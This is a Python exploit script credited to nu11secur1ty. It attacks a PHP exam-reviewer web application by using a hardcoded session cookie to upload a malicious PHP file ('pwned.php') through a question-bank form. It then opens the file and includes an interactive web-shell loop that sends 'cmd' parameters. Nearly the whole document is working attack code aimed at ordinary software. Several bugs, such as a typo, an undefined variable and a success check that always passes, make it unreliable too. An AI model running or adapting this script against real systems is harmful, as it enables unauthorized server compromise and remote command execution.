#!/usr/bin/python
# nu11secur1ty 2021

from selenium import webdriver
import requests, sys, urllib, re, time
import datetime
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

# Checking and confirming of vulnerable directory traversal
print(Fore.YELLOW +"Checking for vulnerable directory traversal...")
print(Style.RESET_ALL)
time.sleep(5)
target_link="http://192.168.1.135/reviewer/system/system/admins/assessments/databank/files/"
browser = webdriver.Chrome()
browser.get((target_link))
time.sleep(7)
print(Fore.RED +"Boom, we have a vulnerable directory traversal")
print(Style.RESET_ALL)
browser.close()

# Requesting for a session
s = requests.Session() 

cookies = {'PHPSESSID': '1194ba06fcba883d6e9aaf27528b0735'}

print(Fore.YELLOW +"Target URL:")
print(Style.RESET_ALL)
target=input()

def exploit(target, session):
    try:
        WEB_EXPLOIT = target+'/system/system/admins/assessments/databank/files/'+filename
        getdir  = {'cmd': 'echo %CD%'}
        r2 = session.get(WEB_EXPLOIT, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print(Fore.RED +"Could not connect to the exploit.")
            print(Style.REEST_ALL)
            r2.raise_for_status()
            
        print(Fore.GREEN +"Successfully upload the malicious RCE file.")
        print(Style.RESET_ALL)
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
      
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_EXPLOIT, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

# Preparing of the exploit
exploit  = {
               'personImage': 
                  (
                   'pwned.php', 
                   '<?php $dir = "C:/xampp"; $files = scandir($dir); print_r($files); ?>',
                   'application/octet-stream', 
                  {'Content-Disposition': 'form-data'}
                  ) 
             }

# Defining value for form data
data = {'difficulty_id':'1', 'test_desc':'CIVIL ENGINEERING', 'test_desc':'CIVIL ENGINEERING', 'test_subject':'Mathematics, Surveying and Transportation Engineering', 'description':'Hello World', 'option_a':'a', 'option_b':'b', 'option_c':'c', 'option_d':'d',  'answer':'A', 'btnAddQuestion':'Save' }

# Define the name of the exploit file =)
filename = 'pwned.php'

# Uploading the exploit
print(Fore.BLUE +"Uploading malicius RCE...")
print(Style.RESET_ALL)
upload = s.post(target+'system/system/admins/assessments/databank/btn_functions.php?action=add', cookies=cookies, files=exploit, data=data)

shell_upload = True if("" in upload.text) else False
u=shell_upload
if u:
	print(Fore.GREEN +"RCE exploit has been uploaded successfully!")
	print(Style.RESET_ALL)
else:
	print(Fore.RED +"Failed To Upload The RCE exploit!")
	print(Style.RESET_ALL)

# Execute
# Exploit (exploit, s) for other cases
website_link="http://192.168.1.135/reviewer/system/system/admins/assessments/databank/files/pwned.php"
browser = webdriver.Chrome()
browser.get((website_link))	
print(Fore.GREEN + "Press any key to exit the exploit...")
print(Style.RESET_ALL)
input()
browser.close()

            
